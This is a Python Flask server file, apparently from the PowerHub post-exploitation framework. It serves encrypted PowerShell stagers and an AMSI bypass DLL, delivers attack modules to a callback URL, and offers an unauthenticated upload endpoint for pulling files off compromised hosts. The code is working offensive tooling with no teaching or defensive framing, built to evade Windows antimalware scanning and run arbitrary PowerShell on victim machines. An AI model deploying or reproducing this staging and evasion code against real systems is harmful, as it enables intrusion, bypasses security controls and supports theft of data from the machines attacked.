from flask import Flask, render_template, request, Response, redirect, \
         send_from_directory, flash
from powerhub.clipboard import clipboard as cb
from powerhub.stager import modules, stager_str, callback_url, \
        import_modules, BASE_DIR
from powerhub.upload import save_file, get_filelist
from powerhub.directories import UPLOAD_DIR
from powerhub.tools import encrypt, compress, key
from powerhub.auth import requires_auth
from powerhub.repos import repositories, install_repo

from datetime import datetime
from base64 import b64decode, b64encode
import os


app = Flask(__name__)
app.secret_key = os.urandom(16)


@app.route('/')
@requires_auth
def index():
    return redirect('/hub')


@app.route('/hub')
@requires_auth
def hub():
    context = {
        "dl_str": stager_str,
        "modules": modules,
        "repositories": list(repositories.keys()),
    }
    return render_template("hub.html", **context)


@app.route('/clipboard')
@requires_auth
def clipboard():
    context = {
        "clipboard": cb,
    }
    return render_template("clipboard.html", **context)


@app.route('/fileexchange')
@requires_auth
def fileexchange():
    context = {
        "files": get_filelist(),
    }
    return render_template("fileexchange.html", **context)


@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('static/css', path)


@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('static/js', path)


@app.route('/img/<path:path>')
def send_img(path):
    return send_from_directory('static/img', path)


@app.route('/clipboard/add', methods=["POST"])
@requires_auth
def add_clipboard():
    """Add a clipboard entry"""
    content = request.form.get("content")
    cb.add(
        content,
        datetime.utcnow(),
        request.remote_addr
    )
    return redirect('/clipboard')


@app.route('/clipboard/delete', methods=["POST"])
@requires_auth
def del_clipboard():
    """Delete a clipboard entry"""
    n = int(request.form.get("n")) - 1
    cb.delete(n)
    return redirect('/')


@app.route('/m')
def payload_m():
    """Load a single module"""
    if 'm' not in request.args:
        return Response('error')
    n = int(request.args.get('m'))
    if n < len(modules):
        modules[n].activate()
        if 'c' in request.args:
            resp = b64encode(encrypt(compress(modules[n].code), key)),
        else:
            resp = b64encode(encrypt(modules[n].code, key)),
        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")


@app.route('/0')
def payload_0():
    """Load 0th stage"""
    method_name = b64encode(encrypt("Bypass.AMSI".encode(), key)).decode()
    context = {
        "modules": modules,
        "callback_url": callback_url,
        "key": key,
        "method_name": method_name,
    }
    result = render_template(
                    "amsi.ps1",
                    **context,
                    content_type='text/plain'
    )
    return result


@app.route('/1')
def payload_1():
    """Load 1st stage"""
    context = {
        "modules": modules,
        "callback_url": callback_url,
        "key": key,
    }
    result = render_template(
                    "payload.ps1",
                    **context,
    ).encode()
    result = b64encode(encrypt(result, key))
    return Response(result, content_type='text/plain; charset=utf-8')


@app.route('/l')
def payload_l():
    """Load the AMSI Bypass DLL"""
    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa

    filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
    with open(filename, 'rb') as f:
        DLL = f.read()
    DLL = b64encode(encrypt(b64encode(DLL), key))
    return Response(DLL, content_type='text/plain; charset=utf-8')


@app.route('/u', methods=["POST"])
def upload():
    """Upload one or more files"""
    file_list = request.files.getlist("file[]")
    for file in file_list:
        if file.filename == '':
            return redirect(request.url)
        if file:
            save_file(file)
    return redirect('/fileexchange')


@app.route('/d/<path:filename>')
@requires_auth
def download_file(filename):
    """Download a file"""
    return send_from_directory(UPLOAD_DIR,
                               filename,
                               as_attachment=True)


@app.route('/getrepo', methods=["POST"])
@requires_auth
def get_repo():
    """Download a specified repository"""
    msg, msg_type = install_repo(
        request.form['repo'],
        request.form['custom-repo']
    )
    # possible types: success, info, danger, warning
    flash(msg, msg_type)
    return redirect('/hub')


@app.route('/reload', methods=["POST"])
@requires_auth
def reload_modules():
    """Reload all modules from disk"""
    try:
        global modules
        modules = import_modules()
        flash("Modules reloaded (press F5 to see them)", "success")
    except Exception as e:
        flash("Error while reloading modules: %s" % str(e), "danger")
    return render_template("messages.html")


def debug():
    m = request.args.get('m')
    result = [x for x in modules if m in x.name]
    if result:
        response = Response(
            b64decode(result[0].code),
            content_type='text/plain; charset=utf-8'
        )
    else:
        response = Response("not found")
    return response
